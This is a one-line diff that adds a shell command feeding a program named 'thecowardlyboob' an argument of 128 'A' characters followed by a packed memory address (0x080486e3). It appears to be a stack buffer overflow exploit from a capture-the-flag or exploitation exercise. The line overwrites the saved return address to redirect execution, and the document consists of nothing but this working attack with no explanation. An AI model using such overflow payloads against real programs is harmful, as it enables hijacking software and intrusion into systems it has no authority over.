@@ -1,0 +1,1 @@
+./thecowardlyboob `python -c 'import struct;print "A"*128 + struct.pack("I", 0x080486e3)'`
